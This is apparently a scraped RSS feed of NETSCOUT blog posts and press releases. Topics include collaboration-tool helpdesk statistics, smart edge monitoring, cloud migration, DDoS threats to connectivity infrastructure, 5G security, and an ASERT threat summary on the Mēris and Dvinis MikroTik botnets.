<p>"The future success of hybrid workforces and work-from-home employees is directly tied to efficient, continuous, quality communications and collaboration," said Richard Costello, senior research analyst, IDC. "To ensure continued business continuity and end-user experiences, organizations need greater visibility across varied and complex work environments, such as that offered by NETSCOUT Smart Edge Monitoring, to better determine and mitigate root causes."</p>

<p>IT teams can use Smart Edge Monitoring to analyze the communications path through auto-generated UCaaS transaction metrics that rapidly pinpoint user configuration, application protocol, internet service provider, or server issues with more advanced visibility than traditional tools. Smart Edge Monitoring can identify what causes performance degradation and why - all within a single solution and workflow.</p>

<p>"Organizations have come to rely on communication and collaboration software to keep their employees connected and productive, no matter where they are performing their jobs," said Michael Szabados, chief operating officer, NETSCOUT. "The future of work requires visibility into complex network environments, and NETSCOUT gives IT teams the tools they need to resolve even the most challenging communications-related issues to deliver consistent, high-quality, UCaaS experiences."</p>

<p>Today's announcement follows new research that finds that 93% of enterprise-level organizations have increased their use of Unified Communications and Collaboration (UC&amp;C) platforms since the onset of the COVID-19 pandemic. The increased use has generated a flood of helpdesk requests with implications for the future of work and employee productivity. From our recent survey of enterprises, nearly half of helpdesk tickets (43%) relate to UC&amp;C issues.</p>

<p>"The research shows that while communications and collaboration platforms remain vital for organizations, growing pains continue. Employees continue to be plagued with technical challenges that limit their productivity even as IT teams are under additional strain to diagnose and resolve them in a timely fashion," continues Szabados. "NETSCOUT Smart Edge Monitoring's intelligent, packet-based approach allows IT teams to see performance problems across complex hybrid work environments to better triage, support, and quickly extinguish root causes."</p>

  <title>NETSCOUT Research Reveals That Issues With Unified Communications and Collaboration Tools  are Responsible for Over 50% of All Helpdesk Tickets</title>
  <link>http://localhost:7996/press-releases/half-helpdesk-unified-communications</link>
  <description>NETSCOUT has released new research that shows activity and trends of enterprise-level organizations related to their use of UC&amp;C platforms since the onset of the COVID-19 pandemic.</description>
  <content:encoded><![CDATA[<p>In addition, NETSCOUT’s research shows that 93% of enterprise-level organizations have increased their use of Unified Communications and Collaboration (UC&amp;C) platforms since the onset of the COVID-19 pandemic. The additional usage and increased performance problems have created a flood of employee-generated IT helpdesk requests - raising concerns around the impact it has on employee productivity.</p>

<p>Comparing results to similar research conducted last year, NETSCOUT found that 72% of enterprises currently support between 3 and 9 UC&amp;C tools, an increase of 9% since 2020. As well, 98% said collaboration software is essential to their organizations' hybrid work policies.</p>

<p>UC&amp;C-related helpdesk tickets are rising, representing a growing strain on IT and employee productivity. Among 43% of the organizations surveyed, over half of all helpdesk tickets relate to UC&amp;C issues. Furthermore, 93% of senior IT leaders say they are concerned technical challenges with UC&amp;C platforms; including providers like Microsoft Teams, Zoom, Slack, Cisco Webex, and Google Meet, may temporarily impact productivity within their organizations.</p>

<p>Additional findings from the research include:</p>

<ul>
	<li>Most UC&amp;C helpdesk tickets (56%) take a few hours to resolve, and 1 in 4 organizations troubleshoot multiple UC&amp;C-related tickets per day.</li>
	<li>The most common UC&amp;C tickets that IT departments receive are device configuration, screen sharing challenges, and maintenance/updates. In addition, about 1/3 of organizations frequently get reports of poor video quality, delays, poor audio quality, and inability to log into Unified Communications as a Service (UCaaS).</li>
	<li>IT professionals using tools, applications, and software to pinpoint potential network issues or security problems impacting UC&amp;C applications have doubled year over year.</li>
	<li>Microsoft Teams is the preferred UC&amp;C platform by IT leaders (42%), followed by Zoom (25%), Webex (17%), Google Meet (9%), and Slack (6%).</li>
	<li>After increasing tools during the pandemic, 86% of enterprises plan to consolidate the number of UC&amp;C platforms used by employees in the next year</li>
</ul>

<p>"The research shows that while UC&amp;C platforms remain critical for organizations, growing pains continue,” said Michael Szabados, chief operating officer, NETSCOUT. “Employees remain plagued with technical challenges that limit their productivity even as IT teams are under additional strain to diagnose and resolve them in a timely fashion. Organizations need intelligent, packet-based monitoring solutions that allows IT teams to see performance problems across complex hybrid work environments to better triage, support, and quickly extinguish root causes."</p>

<p>The survey was conducted in October 2021 among 300 IT decision-makers in the United States and Canada at companies with more than $1 billion in revenue. Read the press release <a href="https://www.netscout.com/press-releases/research-shows-ucc-issues-half-helpdesk-tickets">here</a>.</p>

  <title>NETSCOUT’s Test Optimization Group Annual Employee Potluck Benefits Make-A-Wish New Jersey</title>
  <link>http://localhost:7996/blog/netscouts-test-optimization-group-annual-employee-potluck</link>
  <description>NETSCOUT Test Optimization Solutions group celebrates annual tradition of donating to Make-A-Wish NJ</description>
  <content:encoded><![CDATA[<p>In 2016 the NETSCOUT <a href="https://www.netscout.com/solutions/test-optimization">Test Optimization Solutions</a> group in Marlton, New Jersey decided that rather than have the company pay for another luncheon to celebrate the end of the year holidays, they’d rather have a potluck and donate the cost of a catered meal for the whole office to a charity of the employees’ choosing, and <a href="https://www.netscout.com/corporate-responsibility/connected-for-good">NETSCOUT Heart of Giving</a> agreed. After an employee survey seeking suggestions, <a href="https://wish.org/nj">Make-A-Wish New Jersey</a> became the unanimous choice. Employees expressed that they very much wanted to help grant a life-changing wish for a child, and the first Holiday Potluck Luncheon was created. It was also the first year they used their Heart of Giving grant to donate, and they’ve continued the tradition ever since. Employees reported that knowing how life-changing and impactful it is to help make a child’s wish come true, the decision to continue the tradition was easy, and December 9, 2021 marks the fifth year in a row that they’ve obtained a grant to help support Make-A-Wish NJ. Sadly, because of covid, they did not have their luncheon in 2020, but they <em>still</em> donated to Make-A-Wish because the office is that dedicated to this tradition!</p>

<p>The entire office pitches in to make the Holiday Potluck fun too. They decorate; everyone brings a dish–some prepping and cooking right on site – and they all sign and send a thank you letter to Make-A-Wish. Weirdly, ugly sweaters are NOT a feature of this shindig, but principal software quality assurance (think that’s what the title means?) engineer Chuck Kuski’s snazzy holiday blazer has put the rest of the office on notice. Maybe this year or next he’ll have some competition or compatriots? When asked about the event in general, Kuski said that he enjoyed wearing his holiday garments to the office, but that contributing to children in need within the community is what makes this holiday tradition meaningful to him. “I like the food as well.”</p>

<p><img alt="Potluck Images" src="http://localhost:7996/sites/default/files/2021-12/16/images/test-optimization-group-annual-employee-potluck-benefits-make-a-wish-photos.jpg" /></p>

<p>Speaking of the food, there IS a bit of competition amongst the cooks as they try to out-do each other, and isn’t that what we <em>all </em>hope for at our potlucks? Memorable dishes from years past include: secret recipe chili, fancy grilled pork, chicken tagine with butternut squash, cheesy potatoes, and even homemade meatballs from an ‘old family recipe.’ The team waits breathlessly and hungrily for each year’s offerings! Eileen Bramley, manager, sales administration noted, “It’s a perfect reason to step away from your desk and celebrate the season! The most fun aspect is discovering who the real chefs are and seeing what specialty dishes they create. We’ve had chicken adobo, baked ziti, roast beef, lasagna, spinach balls and teriyaki chicken to name just a few. And desserts galore – cheesecake, homemade brownies, cookies, pies and even pecan tarts. It’s a culinary extravaganza!” Seems like <em>this</em> NETSCOUT office knows what they’re doing when it comes to lab tests and taste tests. (Too cheesy, dear reader? So sous vide me.)</p>

<p>When caught between his many responsibilities as a senior traffic coordinator and reliable yearly volunteer at these events, Mike Adams said, “What I like most about the potluck it is that we're doing something good for the kids who benefit from Make-A-Wish, and we get to connect and catch up with each other in a fun, relaxed way."</p>

<p>Undoubtedly, they’re looking forward to this fifth year’s spread! Frankly, I’ll bet we all wish we could join them for lunch. Even though we cannot, we can <em>all </em>do similar things to help people in our own communities. Bringing hope, strength and joy to others should be a year-long, everyday endeavor. We’re truly thankful for NETSCOUT’s commitment to making a difference in our communities and allowing us to touch others even in the smallest ways to make a better life for us all.</p>

<p>Happy Holidays, dear readers!</p>

  <title>Why Cyber Resiliency Has Transitioned From A Security Initiative To A Business Strategy</title>
  <link>http://localhost:7996/blog/why-cyber-resiliency-has-transitioned-security-initiative</link>
  <description>Cyber Resiliency is needed as Triple Extortion attacks combine with Ransomware-as-a-Service (RaaS) and DDoS to increase the odds of the extortion payment.</description>
  <content:encoded><![CDATA[<p>One of the biggest changes that the pandemic has created for enterprises is the need to incorporate digital strategies that support remote connectivity. Whereas IT and security teams didn't necessarily need strong collaboration to support a limited number of remote devices and workers before the pandemic, that's no longer the case.</p>

<p>Not only are enterprises still supporting remote work initiatives, but they’re also increasingly expecting that remote work is now the rule, as opposed to the exception. Meanwhile, cyber attackers also have continued to react and adjust to these changes, resulting in more varied attacks that target enterprise networks.</p>

<p>This can clearly be seen through the use of Triple Extortion attacks, which combine Ransomware-as-a-Service (RaaS) and DDoS extortion to increase the odds of the extortion payment. The triple extortion attempt consists of:</p>

<ol>
	<li>Encrypting data with ransomware and demanding payment for a decryption key</li>
	<li>Stealing data with the threat to expose or sell publicly unless payment is received and</li>
	<li>The attacker launches a Distributed Denial of Service (DDoS) attack to prove the seriousness of the threat, block communication to internal network resources and overwhelm security teams.</li>
</ol>

<p>Attackers also have amplified the seriousness of such attacks by waging attacks against devices that enterprises are using to support remote work initiatives. This includes everything from attacking VPN concentrators to brute force Remote Desktop Protocol (RDP) attacks. The end result is that enterprises are not only experiencing a substantial increase in attacks overall, but they're also being hit with secondary and tertiary attacks as well.</p>

<p><strong>The Changing Role of Cyber Resiliency</strong></p>

<p>Not surprisingly, the increases and changes to the attack vectors have required enterprises to rethink their approach to cyber resiliency; or their ability to predict, resist, recover from, and adapt to attacks. While developing a cyber resiliency plan was viewed as more of a security initiative before the pandemic, all of the changes enterprise IT and security have undergone has likewise transitioned cyber resiliency to a much-needed business strategy.</p>

<p>That strategy dictates a company's ability to predict, resist, recover from and adapt to the massive changes in cyberattacks. Cyber resiliency requires visibility across the entire enterprise – including how a business operates, its value chain, the flow of data and information across the enterprise, and the identification of critical applications and systems.</p>

<p>When done correctly, cyber resiliency improves a company's ability to identify and measure risk, while also improving visibility for both IT and security teams tasked with protecting company resources. To incorporate cyber resiliency as a business strategy, companies should look for scalable solutions that use curated threat intelligence data to identify potential threats.&nbsp;</p>

<p>Organizations should have comprehensive packet level visibility into all internal east-west network traffic, no matter where the internal network may reside (e.g. inside corporate walls or in a public cloud) to identify anomalous behavior and attacker lateral movement. In addition, organizations need packet level visibility into north-south traffic at the network edge, where they can both detect and block cyber threats.&nbsp;&nbsp;</p>

  <title>Working on the Edge: Overcoming Network Uncertainty </title>
  <link>http://localhost:7996/blog/working-edge-overcoming-network-uncertainty</link>
  <description>IT professionals today are increasingly on edge. Or more precisely, they’re working on the edge.

  <content:encoded><![CDATA[<p>IT professionals today are increasingly on edge. Or more precisely, they’re <em>working</em> on the edge.</p>

<p>According to a recent <a href="https://www.iotevolutionworld.com/iot/articles/449111-new-statistics-from-eclipse-foundation-indicate-that-edge.htm">Eclipse Foundation survey</a>, adoption of edge computing is on the rise, with 54 percent of organizations either using or planning to use edge computing technologies within 12 months and another 30 percent planning to evaluate edge deployments over the next one to two years.</p>

<p>One of the biggest challenges IT faces in migrating to the cloud and taking advantage of edge computing is moving on-premises apps. Apps created for the cloud are different than traditional on-prem architected apps. The subtle differences can result in technical complexities that may have negative impacts on the user experience. Worst of all, these problems may not reveal themselves until IT starts receiving complaints from end users.</p>

<p>This “awareness gap” can be solved by only one thing—greater visibility.</p>

<p><strong>Visibility into Dependencies and Interconnections Is Key </strong></p>

<p>The many edges involved in today’s hybrid cloud infrastructures can create blind spots for IT, making it difficult to quickly identify the source of issues. Adding to the challenge, cloud environments are fluid, constantly changing and morphing to improve efficiency, performance, scalability, and security.</p>

<p>Success before and after cloud migration requires visibility into the numerous dependencies and interconnections between apps and everything they touch. The easiest way to accomplish this is by capturing and analyzing network packets to identify and map all the application connection points.</p>

<p>Such packet-based visibility, from on-prem to the cloud, enables IT to continually evaluate the impact of the cloud’s shifting environment on application performance and interactions. This is key to making much-needed modifications to apps or the environment before problems can adversely affect the user experience.</p>

<p><strong>The Virtues of Smart Edge Monitoring </strong></p>

<p>Monitoring is essential for meeting the needs of today’s highly complex, multi-edge environments. Instrumentation placed at key vantage points enables effective monitoring and troubleshooting of application performance issues that threaten the end-user experience. Smart edge monitoring leverages packet data gathered at the network and service edges with synthetic testing data from the client edge to provide rich analysis from these powerful vantage points.</p>

<p>Synthetic testing, which includes business transaction testing capabilities, makes it possible for IT professionals to simulate an end user’s interactions with an enterprise’s applications. This allows IT to get their hands on detailed performance and availability data, thus enabling them to quickly identify problems. In a best-case scenario, these problems are uncovered before they ever impact the end-user experience.</p>

<p>NETSCOUT is an innovator and industry leader in the field of smart edge monitoring. Our Smart Edge Monitoring solution provides comprehensive, borderless monitoring and visibility. It is the most effective way to assure user experience before and after cloud migration.</p>

<p>As enterprises move applications from on-prem environments to the cloud, it is imperative to identify interconnections and dependencies that may interfere with performance at any point throughout the many edges of the infrastructure. One of the surest ways to gain this much-needed visibility is via packet-based monitoring and synthetic testing.</p>

<p>A true smart edge monitoring solution can uncover infrastructure blind spots and deliver unobstructed visibility into what’s happening within apps, regardless where they reside. Today’s highly complex hybrid environments demand nothing less.</p>

  <title>Ensure Performance and User Experience During Application Migrations</title>
  <link>http://localhost:7996/blog/ensure-performance-ux-during-app-migration</link>
  <description>Learn how to assure performance during application migrations.</description>
  <content:encoded><![CDATA[<p><a href="https://www.flexera.com/about-us/press-center/flexera-releases-2021-state-of-the-cloud-report.html">Flexera’s 2021 State of the Cloud Report</a> concluded that for some respondents, one of the impacts of the COVID-19 pandemic was to accelerate the process of migrating applications to the cloud. In fact, Flexera’s recent survey revealed that 54 percent of workloads were expected to be in the cloud within the next 12 months.</p>

<p>When migrating applications to the cloud, lift and shift or refactoring both carry challenges that are critical enough for many IT teams to consider ways to reduce issues and/or triage problems that emerge during the planning stages or before initiating early test or trial phases of the migration. Problems end users may experience include:</p>

<ul>
	<li>Inability to log into the new application</li>
	<li>Slower response times performing specific processes in the application</li>
	<li>Inability to access particular information</li>
</ul>

<p>Knowing these migrations are not a flip-of-a-switch, overnight event, ensuring application performance throughout the migration timeline—before, during, and after the transition—will help give IT and the overall enterprise the confidence that critical applications and the services they deliver will not be interrupted.</p>

<p>Consider the real-world example of a global service company that was involved in a major migration to bring all of its employees onto a single, cloud-based application for enterprise resource planning (ERP). Due to the critical nature of this ERP application to the business’s entire customer engagement and service delivery, ensuring performance of the service was a priority of the IT team.&nbsp;</p>

  <title>What Are the Weak Links in the Connectivity Supply Chain—and Why Is NETSCOUT Seeing So Many More Attacks?</title>

  <content:encoded><![CDATA[<p>As explained in a previous blog, “<a href="https://www.netscout.com/blog/supply-chain-connectivity-and-why-attackers-care">What Is the Connectivity Supply Chain, and Why Do Attackers Care?</a>”, NETSCOUT has been tracking increased distributed denial of service (DDoS) attacks against the connectivity supply chain—the moniker we’ve given to the technologies and services that enable companies and individuals to stay connected to the internet.</p>

<p>There are two important factors to take into consideration here: identifying the weak links in the connectivity supply chain, and understanding why NETSCOUT is seeing so many more DDoS attacks against this vital business artery than other companies are reporting.</p>

<p><strong>What Are the Weak Links in the Connectivity Supply Chain?</strong></p>

<p>There are four areas of particular concern in the connectivity supply chain that enterprises should understand to protect their resources from DDoS attacks and ensure uninterrupted connectivity:</p>

<ul>
	<li>According to the latest <a href="https://www.netscout.com/threatreport">NETSCOUT Threat Intelligence Report</a>, there were about 4,000 DDoS attacks in the first half of the year that targeted the Domain Name System (DNS), the database that stores internet domain names and translates them into IP addresses. Most frequently, these were DNS reflection/amplification DDoS attacks that cause connection and timeout issues for websites.</li>
	<li>More than 41,000 attacks were leveled against virtual private networks (VPNs), the use of which skyrocketed during the COVID-19 pandemic as enterprises were forced to support remote-work initiatives. Attacks such as the Lazarus Bear Armada (LBA) DDoS extortion campaign against VPNs disconnect users from enterprise assets and prevent security teams from responding to attacks.</li>
	<li>Internet Exchanges experienced more than 1,000 DDoS attacks during the first half of the year, 70 percent of which were TCP SYN floods.</li>
</ul>

<p>The most important aspect of attacks on these critical areas of connectivity is the collateral damage inflicted. Even if the attack does not take the component fully offline, these services represent hundreds of thousands, if not millions, of consumers, and are the gateways to everything we do online. Take one down, and you impact a huge array of people, organizations, and service providers</p>

<p><strong>Why Is NETSCOUT Seeing So Many More Attacks?</strong></p>

<p>If the number of DDoS attacks against the connectivity supply chain seems much higher than is being reported by other security firms, it’s not a mistake on our part. Because of NETSCOUT’s unique partnerships with almost every ISP in the world, we are able to see attacks that occur on those ISP networks, as well as those targeting their customers’ networks—giving us a much wider spectrum of visibility than other firms have.</p>

<p>For more information about the weak links in the connectivity supply chain and how to protect against DDoS attacks, read our white paper <a href="https://www.netscout.com/sites/default/files/2021-11/SECWP_021_EN-2101%20-%20The%20Weakest%20Link.pdf">The Weakest Link:</a> Attackers Target Connectivity Supply Chain to Disable Enterprise Internet Connectivity, or get in touch with a security specialist today.</p>

  <title>Making 5G a Trusted Network</title>
  <link>http://localhost:7996/blog/making-5g-trusted-network</link>
  <description>NETSCOUT’s Dr. Vikram Saksena describes the key elements enterprises must consider to strengthen 5G network security.</description>
  <content:encoded><![CDATA[<p>5G is here: By the year 2023, it is estimated that 5G will enable fully autonomous “smart factories” that could add <a href="https://www.capgemini.com/us-en/research/smart-factory-scale/">$1.5 trillion to $2.2 trillion</a> annually to the global economy. But along with all the benefits 5G offers—including more security than previous wireless network technologies—cybersecurity challenges exist.</p>

<p>Unlike previous technologies, 5G delivers low latency and high throughput, and this capability opens the landscape for many industries to create new applications while supporting mission-critical services for their businesses and end users.</p>

<p>Assuring 5G services is vital: These new applications will be fulfilling mission-critical duties such as remote surgery, where any blip or failure could be detrimental to a patient’s life. Malicious attacks can increase quickly and multiply to degrade latency and/or even stop service.</p>

<p>This scenario is consistent with the most common form of cyberattack, distributed denial of service (DDoS), and 5G with its diverse ecosystem creates many more pathways for attack vectors. Although 5G comes with more secure and improved cybersecurity features than its predecessors—deeper security for layer 7 protocols with advanced ciphering algorithms, for example—enterprises must carefully consider a wholistic 5G implementation for configuration and monitoring.</p>

<p>In “<a href="https://www.business2community.com/mobile-apps/making-5g-a-trusted-network-part-i-cybersecurity-02426807">Making 5G a Trusted Network: Part I</a>,” NETSCOUT Chief Solutions Architect Dr. Vikram Saksena provides insights into the following topics:</p>

<ul><li>What is really missing from the 5G and cybersecurity conversation?</li>
	<li>The essential need to protect mission-critical 5G services</li>
	<li>The key elements necessary for making 5G a trusted network</li>

  <title>To Cloud or Not to Cloud? That is No Longer the Question.</title>
  <link>http://localhost:7996/blog/cloud-no-longer-question</link>
  <description>Our world has experienced a massive shift to online work and play, which has accelerated an already-rapid adoption of cloud services.

  <content:encoded><![CDATA[<p>Our world has experienced a massive shift to online work and play, which has accelerated an already-rapid adoption of cloud services. A recent <a href="https://www.accenture.com/nl-en/blogs/insights/cloud-trends"> Accenture </a> study found that 92 percent of organizations already are at least somewhat in the cloud, and that as of 2020, approximately 50 percent of all corporate data was stored in the cloud. Worldwide expenditures on public cloud services are projected to grow by more 18 percent this year alone.</p>

<p>This has resulted in a fundamental shift in how companies build and manage their infrastructure, and they need to rethink their monitoring strategies as a result. One prime example is cloud migration.</p>

<p>Constant innovations in cloud technology, including a wealth of affordable hybrid cloud solutions, has enabled IT organizations to implement significant workload migration projects in the cloud. With more and more businesses moving vital services to the cloud, shifting infrastructure to co-los, reengineering private data centers, and embracing new software-as-a-service (SaaS) applications, the importance of ensuring the performance and security of networks and applications has never been greater.</p>

<p>The challenge has been that cloud-based tools used to evaluate and troubleshoot issues have tended to be cloud dependent. With today’s hybrid, multi-cloud environments, which typically involve multiple vendors delivering different aspects of critical services, a lack of visibility across the many complex edges involved leaves IT in the dark.</p>

<p><strong>Preserving User Experience and Quality of Service Pre- and Post-Migration </strong></p>

<p>To assure the quality of service and user experience prior to and following workload migration, IT needs troubleshooting capabilities that are both cloud and application agnostic. This is made all the more difficult because the underlying infrastructure is generally owned and managed by multiple IT domains and external third parties.</p>

<p>Dealing with issues is considerably more challenging when those responsible aren’t even in the war room. With these complex environments, there can be a nearly infinite number of possible causes to a problem. This serves to only further exacerbate the finger-pointing during triage and troubleshooting, making it that much harder and time-consuming to resolve the problem.</p>

<p><strong>An Array of Edges Creates Visibility Challenges</strong></p>

<p>The many edges found throughout the IT environment—from client edge, to network edge, to data center/cloud service edge—can create gaps in visibility. When traffic issues occur at these edges, they can quickly impact the productivity of employees who rely on application services to get mission-critical work done. Because of the sheer numbers of edges involved in day-to-day connectivity, and during cloud migrations in particular, IT needs vendor-agnostic visibility to rapidly identify the source of issues.</p>

<p>Identifying key instrumentation vantage points is crucial for monitoring and troubleshooting application performance issues that threaten the end-user experience. The most effective approach in today’s complex, multi-cloud environments is to monitor packet data at the different edges and combine that effort with synthetic testing data.</p>

<p>Synthetic testing that includes business transaction testing capabilities allows IT to simulate an end-user’s interactions with an enterprise’s applications. This type of testing can enable IT to obtain detailed performance and availability data, so they can readily identify any problems before, during, and after application migrations to the cloud. In some cases, this can be done even before end users are impacted, preventing broadscale disruptions.</p>

<p>When packet data, gathered at the edge, is brought together with synthetic testing, smart edge monitoring is achieved. NETSCOUT is an industry leader in smart edge monitoring. Our NETSCOUT Smart Edge Monitoring solution provides comprehensive, borderless monitoring and visibility and is the most effective way to assure user experience before and after cloud migration.</p>

  <link>http://localhost:7996/blog/netscout-achieves-aws-migration-and-modernization-competency</link>
  <description>NETSCOUT has achieved both Networking and AWS Migration and Modernization Competencies, which demonstrates unique skills in areas across industries, use cases, and workloads.</description>
  <content:encoded><![CDATA[<p>In most cases, it’s not a matter of if you will migrate to the cloud, it’s a question of when. According to an IDC Futurescape prediction: by 2024, 75% of enterprises will prioritize infrastructure agility and operational efficiency; leading to a five-fold increase in the adoption of cloud native architectures for core business applications. This poses new challenges as enterprises grapple with an increasingly complex infrastructure.</p>

<p>Migrating applications to the cloud creates new visibility borders across private cloud, hybrid cloud and multi-cloud environments, increasing the challenges of delivering high-quality services. Assuring the performance and security requirements of workloads pre- and post-migration means having Visibility Without Borders for end-thru-end insights necessary for migrating applications to the cloud with confidence.</p>

  <title>Is IT Staff Turnover Putting Your Network in Peril? </title>
  <link>http://localhost:7996/blog/it-staff-turnover-putting-your-network-peril</link>
  <description>According to a recent survey, the annual rate of staff turnover among technical employees is nearly 20 percent. A VaaS provider can train your IT personnel, offering invaluable knowledge transfer.</description>
  <content:encoded><![CDATA[<p>There’s really nothing like that new-car smell. I suppose a similar thing can be said of freshly implemented network technology, but instead of inhaling that distinctive aroma, IT staffers’ minds are filled with freshly acquired knowledge on how to keep systems up and running smoothly.</p>

<p>In those early days of implementation, IT teams are provided in-depth training and critical resources to handle the day-to-day responsibilities of newly implemented, capital-funded IT solutions. But over time, IT personnel inevitably change roles and shift responsibilities, get promoted, move to other companies, or just plain retire. In fact, a recent <a href="https://financesonline.com/employee-turnover-statistics/">survey</a> found that among technical employees, there is a nearly 20 percent rate of staff turnover every year. Regardless of the reason, the outcome remains the same: Organizations are left with a reduced ability to manage network technology.</p>

<p>This IT “brain drain” leaves organizations vulnerable. Invaluable technical knowledge and experience is gradually lost, and without proper levels of support, technologies themselves can languish and even become obsolete.</p>

<p><strong>The Bottom-line Value of Uninterrupted Support </strong></p>

<p>Having a consistent level of expert support is essential to maintaining the highest-quality use of an enterprise’s networks, applications, and services. It is also critical for supporting annual maintenance, software upgrades, expansions, and enhancements to vital technology infrastructure.</p>

<p>Beyond the importance of keeping systems up and running for the sake of business efficiency and end-user satisfaction, having uninterrupted support makes good bottom-line sense. Ensuring continuous support protects investments made in the technology. After all, capital expense and accounting write-offs typically take three to five years, after which time the systems are essentially paid for. Avoiding obsolescence is the best way to protect that investment.</p>

<p><strong>Managed Monitoring Services to the Rescue</strong></p>

<p>One way IT organizations can solve the brain-drain dilemma is via managed monitoring services. Using a visibility-as-a-service (VaaS) solution enables IT to harness outside expertise to support maintenance of network and related technologies. A VaaS provider can also be an invaluable source of knowledge. The expertise of VaaS professionals ensures knowledge transfer and continuous education of internal IT staff—not only concerning the technology itself, but also concerning best practices on how to apply all the valuable features and capabilities of that technology.&nbsp;</p>

<p>When it comes to managed monitoring services, NETSCOUT VaaS has the expertise IT organizations need to manage, analyze, and support network infrastructures, including voice, video, and software-as-as-service (SaaS) applications.</p>

<p>NETSCOUT’s unparalleled depth of knowledge makes it possible for its VaaS professionals to share invaluable industry best practices, which can be leveraged to ensure quick time to value for rapid resolution of issues. In this way, VaaS protects organizations from IT turnover and loss of technology knowledge by providing that continuity of management and support.</p>

<p>A network engineer from one recent customer described the engagement with NETSCOUT this way: “The VaaS team has helped with monitoring of our environment and helped us understand our equipment. I feel comfortable going into an incident knowing I have them to help in the situation.”</p>

  <title>Mēris &amp; Dvinis Botnets</title>
  <link>http://localhost:7996/blog/asert/meris-dvinis-botnets</link>
  <description>Threat adversaries leverage exploitable Mikrotik routers with two different botnets, Mēris and Dvinis, to launch high request-per-second attacks against targets.</description>
  <content:encoded><![CDATA[<h1>ASERT Threat Summary</h1>

<p><strong>Date: </strong>November 16, 2021<br />
<strong>Severity:</strong> Warning<br />
<strong>Distribution: </strong>TLP: <a href="https://www.us-cert.gov/tlp">WHITE</a>&nbsp;<br />
<strong>Categories: </strong>Availability<br />
<strong>Contributors:</strong> Chris Conrad, Jon Belanger, John Kristoff, Bill McDonough, Marco Gioanola, Chad Robertson, Alexander Lyamin.</p>

<h2>Executive Summary</h2>

<p>In September of 2021, internet security firm QRator published a weblog <a href="https://blog.qrator.net/en/meris-botnet-climbing-to-the-record_142/">post</a> describing an Internet of Things (IoT) botnet consisting of compromised Mikrotik routers which, beginning in June of 2021, have been used to launch several high-profile HTTP and HTTPs-based application-layer DDoS attacks. These DDoS attacks are notable for their use of HTTP pipelining (which allows multiple HTTP requests to be made over a single TCP connection), as well as for their relatively high attack volumes of several million HTTP and/or HTTPs requests-per-second (RPS). QRator named this botnet <em>Mēris</em>, which is the Latvian word for plague.<br />
Subsequent to the initial reports of the <em>Mēris</em> botnet, NETSCOUT's ASERT determined that a second, distinct DDoS-capable IoT botnet is also present in the same general population of unpatched, exploitable Mikrotik routers. This second Mikrotik-based IoT botnet has been dubbed <em>Dvinis</em>, which is the Latvian word for twin.<br />
To date, HTTP and HTTPs application-layer DDoS attacks appear to be the sole attack vectors employed by these botnets. It is unclear whether either&nbsp;bots have the capability to launch additional types of DDoS attacks.</p>

<p><strong>Note: </strong>Observed HTTP and HTTPs DDoS attacks originating from the <em>Dvinis</em> botnet do not make use of HTTP pipelining, and that there is a distinctive double-‘//’ at the end of targeted URIs in <em>Dvinis</em>-generated synthetic DDoS attack traffic.</p>

<h2>Key Findings</h2>

<ul>
	<li>Both&nbsp;<em>Mēris&nbsp;</em>and&nbsp;<em>Dvinis</em>&nbsp;take advantage of the same population of exploitable Mikrotik routers to exist and thereby launch DDoS attacks.</li>
	<li>These bots differ from each other in the use of HTTP Pipelining, as well as what the bot configures on the compromised Mikrotik router as noted in our previous blog, <a href="https://www.netscout.com/blog/asert/tale-two-botnets">A Tale of Two Botnets</a>.</li>
	<li><em>Mēris&nbsp;</em>and<em>&nbsp;Dvinis</em>&nbsp;can both be mitigated using industry Best Current Practices (BCPs) and by disabling HTTP Pipelining on applicable devices and practicing good network hygiene to eliminate exploitable Mikrotik devices from networks.</li>
</ul>

<h2>Analysis</h2>

<p>While the reported attacks associated with <em>Mēris</em> were not trivial in terms of volume, none of then have achieved high water marks or record-breaking numbers from NETSCOUTs observations and DDoS attacks launched by both the <em>Mēris</em> and <em>Dvinis</em> botnets have been successfully mitigated by network operators. The total numbers of <em>Mēris</em> and <em>Dvinis</em> nodes, as well as the potential number of exploitable Mikrotik routers which can potentially be compromised and subsumed into the these botnets, are unclear at this time. However, ~4,800 <em>Mēris</em> bots and ~3,500 <em>Dvinis</em> bots have been observed actively participating in DDoS attacks against our customers.</p>

<p>In a related weblog <a href="https://blog.mikrotik.com/security/meris-botnet.html">post</a>, Mikrotik stated that the exploitable routers which have been incorporated into these botnets are representative of an older population of devices which were previously compromised in 2018.</p>

<h2>Collateral Impact</h2>

<p>High-volume DDoS attacks can congest peering, transit, core, distribution, and access links, disrupting bystander internet traffic along with legitimate traffic destined for the intended target. Shared networking, computing, storage, and ancillary supporting infrastructure can be negatively impacted. These factors can result in significant collateral damage footprints.</p>

<p>The collateral impact of DDoS attacks launched via the <em>Mēris</em> and <em>Dvinis</em> botnets can be significant for unknowing operators of the compromised Mikrotik routers which comprise the botnet. Legitimate network traffic sourced from or destined to networks within the coverage cone of these botted routers can be negatively impacted under such circumstances. Account credentials and other sensitive information passing through compromised routers may be stolen and leveraged by attackers.</p>

<p>Failure to remove or remediate compromised routers which are abused to launch DDoS attacks can lead to affected network operators filtering all network traffic originating from networks where such systems are deployed. Unintentional overblocking of legitimate network traffic can occur when insufficiently granular mitigation methods are employed. Such overblocking must be evaluated in the light of actions necessary to bring about partial service recovery of targeted servers/applications/services/networks.</p>

<h2>Mitigating Factors</h2>

<p>DDoS attack traffic can be mitigated via the implementation of industry-standard best current practices (BCPs) such as situationally-appropriate network access control policies; network infrastructure-based reaction mechanisms such as flowspec; and intelligent DDoS mitigation systems (IDMS's) such as NETSCOUT Arbor <a href="https://www.netscout.com/product/arbor-sightline">Sightline</a>, <a href="https://www.netscout.com/product/arbor-threat-mitigation-system">TMS</a>, and <a href="https://www.netscout.com/product/netscout-aed">AED/APS</a>.</p>

<p>Collateral impact to abusable, botted routers can motivate network operators and/or end-customers to remove or remediate affected systems.</p>

<p>HTTP and HTTPs application-layer DDoS attack traffic can be mitigated via the implementation of industry-standard BCPs such as situationally-appropriate network access control policies, network infrastructure-based reaction mechanisms such as flowspec, and IDMS's such as NETSCOUT Arbor <a href="https://www.netscout.com/product/arbor-sightline">Sightline</a>, <a href="https://www.netscout.com/product/arbor-threat-mitigation-system">TMS</a>, and <a href="https://www.netscout.com/product/netscout-aed">AED/APS</a>.<br />
Due to their requirement for the establishment of a full TCP three-way handshake, DDoS attacks utilizing these specific vectors cannot be spoofed, which allows source-based mitigation mechanisms to be employed by defenders.&nbsp;</p>

